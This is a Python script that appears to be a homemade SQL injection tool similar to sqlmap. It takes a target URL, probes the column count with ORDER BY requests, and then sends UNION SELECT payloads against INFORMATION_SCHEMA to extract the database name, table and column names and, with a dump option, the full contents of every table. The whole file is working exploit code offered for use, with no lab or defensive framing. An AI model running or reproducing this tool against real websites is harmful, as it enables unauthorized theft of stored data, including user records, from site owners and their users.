from typing import Text
import requests
from requests.sessions import get_environ_proxies
from bs4 import BeautifulSoup
from getopt import getopt
import sys
import pandas as pd
from tabulate import tabulate

database = False
table = False
column = False
dump = False
column_count = 0
url = ''
db = ''
tb = []
visible_column = 0
columns = []

def get_column_count():
    global column_count
    for i in range(1,50):
        target_url = url + ' order by %d'%(i)
        resp = requests.get(target_url)
        
        if 'error' in resp.text:
            column_count = i - 1
            break

def get_database_name():
    global database
    target_url = url  +  ' UNION SELECT '
    for i in range(1,column_count + 1):
        target_url += "CONCAT('<data>',database(),'</data>')"
        if i != column_count:
            target_url += ','

    # print(target_url)
        
    resp = requests.get(target_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    # print(resp.text)

    database = soup.find("data").decode_contents()
    print("Database Name :",database)

def get_table_count():
    global visible_column
    target_url = url  +  ' UNION SELECT '
    for i in range(1,column_count + 1):
        target_url += "CONCAT('<data>',count(*),'</data>')"
        if i != column_count:
            target_url += ','

    target_url += ' FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = database()'
    
    resp = requests.get(target_url)
    soup = BeautifulSoup(resp.text, 'html.parser')

    visible_column = int(soup.find("data").decode_contents())
    print('There are', visible_column, 'tables in the database')

def get_table_name():
    global tb
    target_url = url  +  ' UNION SELECT '
    for i in range(1,column_count + 1):
        target_url += "CONCAT('<data>',group_concat(table_name),'</data>')"
        if i != column_count:
            target_url += ','
    target_url += ' FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = database()'
    # print(target_url)
    resp = requests.get(target_url)
    soup = BeautifulSoup(resp.text, 'html.parser')

    tb = soup.find("data").decode_contents().split(',')
    print(tb)

# def get_column_count(table_name):
#     target_url = url  +  ' UNION SELECT '
#     for i in range(1,column_count + 1):
#         target_url += "CONCAT('<data>',count(*),'</data>')"
#         if i != column_count:
#             target_url += ','
#     target_url += " FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = " + "'%s'"%(table_name,)

#     resp = requests.get(target_url)
#     soup = BeautifulSoup(resp.text, 'html.parser')

#     count = int(soup.find("data").decode_contents())

#     return count

def dump_table(table_name, columns):
    target_url = url  +  ' UNION SELECT '
    for i in range(1,column_count + 1):
        target_url += "CONCAT('<data>',group_concat({} SEPARATOR ';'),'</data>')"
        if i != column_count:
            target_url += ','
    target_url += " FROM `%s`"%(table_name)

    columns = columns.split(',')
    # print(columns)

    lst = []
    index = []

    for column in columns:
        resp = requests.get(target_url.replace('{}',column))
        soup = BeautifulSoup(resp.text, 'html.parser')

        # print(soup.find("data").decode_contents())
        lst.append(soup.find("data").decode_contents().split(';'))
        index.append(column)

    df = pd.DataFrame(lst,index=index)
    print('The data inside', table_name, 'table')
    print(tabulate(df, headers='keys', tablefmt='grid'))
    print('')

def get_column_name():
    target_url = url  +  ' UNION SELECT '
    for i in range(1,column_count + 1):
        target_url += "CONCAT('<data>',group_concat(COLUMN_NAME),'</data>')"
        if i != column_count:
            target_url += ','
    target_url += " FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = "
    for table in tb:
        resp = requests.get(target_url + "'%s'"%(table))
        soup = BeautifulSoup(resp.text, 'html.parser')

        columns = soup.find("data").decode_contents()
        # print(columns)

        df = pd.DataFrame([columns.split(',')], index=["Column Name"], columns=list(range(len(columns.split(',')))))
        print("Column of", table, 'table')
        print(tabulate(df, headers='keys', tablefmt='grid'))
        print('')

        if dump:
            dump_table(table, columns)

def info():
    print("help menu here")

def main():
    global database, table, db, tb, column, dump, url
    try:
        opts, _ = getopt(sys.argv[1:], "hu:d:D:T:C:", ["help", "db", "tables", "columns", "dump"])
    except Exception:
        exit(info())

    for k, v in opts:
        if k in ("-h", "--help"):
            exit(info())
        elif k in ("-u"):
            url = v
        elif k in ("--db"):
            database = True
        elif k in ("--tables"):
            table = True
        elif k in ("-T"):
            tb = v
        elif k in ("--columns"):
            column = True
        elif k in ("--dump"):
            dump = True

    get_column_count()

    if database:
        get_database_name()

    if table:    
        get_table_count()
        get_table_name()
            
        if column:
            get_column_name()

if __name__ == "__main__":
    main()